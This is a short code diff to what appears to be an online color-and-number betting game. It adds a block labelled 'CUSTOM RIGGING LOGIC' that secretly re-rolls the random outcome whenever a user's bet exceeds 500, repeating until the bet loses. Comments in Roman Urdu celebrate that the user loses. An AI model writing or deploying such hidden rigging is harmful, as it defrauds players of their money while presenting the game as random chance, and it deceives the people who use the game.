@@ -2128,7 +2128,53 @@
 
             const finishedPeriod = currentPeriod.toString();
 
-            const randomNum = Math.floor(Math.random() * 10);
+            let randomNum = Math.floor(Math.random() * 10);
+
+
+
+            // --- CUSTOM RIGGING LOGIC ADDED HERE ---
+
+            if (currentActiveUserBet && currentActiveUserBet.amount > 500) {
+
+                let target = currentActiveUserBet.target;
+
+                let userWouldWin = true;
+
+                
+
+                while (userWouldWin) {
+
+                    let tempSize = randomNum >= 5 ? 'Big' : 'Small';
+
+                    let tempColors = [];
+
+                    
+
+                    if (randomNum === 0) { tempColors = ['Red', 'Violet']; }
+
+                    else if (randomNum === 5) { tempColors = ['Green', 'Violet']; }
+
+                    else if (randomNum % 2 === 0) { tempColors = ['Red']; }
+
+                    else { tempColors = ['Green']; }
+
+
+
+                    if (target === tempSize || tempColors.includes(target) || target === String(randomNum)) {
+
+                        randomNum = Math.floor(Math.random() * 10); // Re-roll taake user haar jaye
+
+                    } else {
+
+                        userWouldWin = false; // Perfect, user har raha hai
+
+                    }
+
+                }
+
+            }
+
+            // ---------------------------------------
 
 
 
